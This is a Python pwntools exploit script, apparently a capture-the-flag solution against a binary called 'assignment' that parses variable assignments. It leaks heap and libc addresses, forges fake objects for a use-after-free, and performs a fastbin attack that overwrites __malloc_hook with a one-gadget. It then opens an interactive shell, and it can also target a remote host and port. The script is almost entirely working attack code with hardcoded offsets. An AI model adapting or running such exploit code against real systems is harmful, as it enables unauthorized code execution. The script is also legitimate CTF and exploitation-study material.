import pdb
from pwn import *
from pwnlib.util.packing import *
from tqdm import *
import re
context.binary='./assignment'
PROMPT='>'
#STRING_SIZE=40

LIBC_BASE_OFFSET_LEAK=0x3BE838
MALLOC_HOOK_OFFSET=0x3BE740

MAGIC_GADGET = 0x4647c
TYPE_STRING=1



OBJ_POINTER_OFFSET=0x3b0-0x30

def pack_obj(name, pointer, next_obj=0):
	return 8*p8(ord(name)) + p64(pointer) + p64(next_obj)

def pack_item(item_type, value):
	return p32(item_type) + p32(0) + p64(value)

def pack_string(size, address):
	return p64(size) + p64(address)

def print_var(p, var):
	p.sendline('')
	p.recvuntil(PROMPT)
	p.sendline(var)
	str_var = p.recvuntil('}')
	return str_var

def print_int(p, var):
	p.sendline('')
	p.recvuntil(PROMPT)
	p.recvuntil(PROMPT)
	p.sendline(var)
	str_var = p.recvuntil(PROMPT)
	return str_var


def add(p, lhs, rhs_1, rhs_2):
	p.sendline('')
	p.recvuntil(PROMPT)
	add_string=lhs+'='+rhs_1+'+'+rhs_2
	p.sendline(add_string)
	p.recvuntil(PROMPT)


def create_n_items(p, n):
	for i in xrange(n):
		create_unnamed_int(p, i)

def create_unnamed_string(p, s):
	p.sendline('')
	p.recvuntil(PROMPT)
	s='"'+s+'"'
	p.sendline(s)
	p.recvuntil(PROMPT)
	
def create_unnamed_int(p, i):
	p.sendline('')
	p.recvuntil(PROMPT)
	string=str(i)
	p.sendline(string)
	p.recvuntil(PROMPT)
		

def create_int(p, name, parent, integer):
	p.sendline('')
	p.recvuntil(PROMPT)
	object_name=parent+'.'+name if not parent is None else name
	create_int_str=object_name+'='+str(integer)
	p.sendline(create_int_str)
	p.recvuntil(PROMPT)

def create_string(p, name, parent, string):
	p.sendline('')
	p.recvuntil(PROMPT)
	object_name=parent+'.'+name if not parent is None else name
	create_str=object_name+'="'+string+'"'
	p.sendline(create_str)
	p.recvuntil(PROMPT)

def main():
	if 1 < len(sys.argv) and sys.argv[1] == "server":
		p = process('./linux_serverx64')
	elif 3 < len(sys.argv) and sys.argv[1] == "remote":
		p = remote(sys.argv[2], int(sys.argv[3]))
	else:
		p = process(['./assignment'])
		if __debug__:
			#gdb.attach(p)
			libs = gdb.find_module_addresses(p)
			print libs
		log.info(util.proc.pidof(p))
	log.info("Creating big string")
	create_unnamed_string(p, "a"*200)

	create_n_items(p, 16)
	create_unnamed_int(p, 'a="aaaaaaa"+0')
	leaked_str = print_int(p, 'a')
	m = re.search('(?<=\s)[0-9]+(?=$)', leaked_str, re.MULTILINE)
	leaked_addr = int(m.group(0))
	log.info("Leaked address: {}".format(hex(leaked_addr)))
	
	create_n_items(p, 15)
	
	item_addr = leaked_addr-0x1a0
	str_addr = leaked_addr-0x140
	address_to_find = leaked_addr-0x2f0

	log.info("Creating objects for UAF")
	create_int(p, 'z', None, OBJ_POINTER_OFFSET)
	create_string(p, 'a', 'a', "a"*8)
	add(p, 'a', 'a', 'z')

	log.info("creating variable at address that will point to {}".format(hex(item_addr)))
	obj_str = p64(0) + p64(0x71) + pack_obj("w", item_addr) +38*p64(0x91)
	create_unnamed_string(p, obj_str)
	
	log.info("creating string value at address {} that will point to {}".format(hex(item_addr), hex(str_addr)))
	item_str = pack_item(TYPE_STRING, str_addr)
	create_unnamed_string(p, item_str)

	log.info("Creating string at {} that will point to {}".format(hex(str_addr), hex(address_to_find)))

	str_str = pack_string(8, address_to_find)
	create_unnamed_string(p, str_str)

	a_var = print_var(p, 'a')
	m = re.search('(?<=:\s").*(?="$)', a_var, re.MULTILINE)	
	address_in_libc = u64(m.group(0))
	log.info("address in libc is : {}".format(hex(address_in_libc)))
	libc_base = address_in_libc - LIBC_BASE_OFFSET_LEAK
	pdb.set_trace()
	log.info("LIBC BASE: {}".format(hex(libc_base)))
	create_int(p, 'a', None, 0)
	
	address_to_write = libc_base + MALLOC_HOOK_OFFSET - 0x13
	log.info("address_to_write: {}".format( hex(address_to_write) )	)
	create_unnamed_string(p, 'a'*0x60)
	create_n_items(p, 13)

	log.info("Fastbin attack...")
	fastbin_attack_string = p64(0) + p64(0x71) + p64(address_to_write) + 40*p64(0x91)
	create_unnamed_string(p, fastbin_attack_string)
	create_unnamed_string(p, 'a'*0x60)
	create_unnamed_string(p, 'a'*0x60)
	one_gadget = libc_base + MAGIC_GADGET
	log.info("one gadget address: {}".format(hex(one_gadget)))
	malloc_hook_string = p8(0x7e) + p8(0)*2 + p64(one_gadget)
	malloc_hook_string_padded = malloc_hook_string + (0x60-len(malloc_hook_string))*'a'
	create_unnamed_string(p, malloc_hook_string_padded)
	
	log.info("Getting Shell")
	create_unnamed_string(p, "")
	
	p.interactive()


if "__main__"==__name__:
	main()
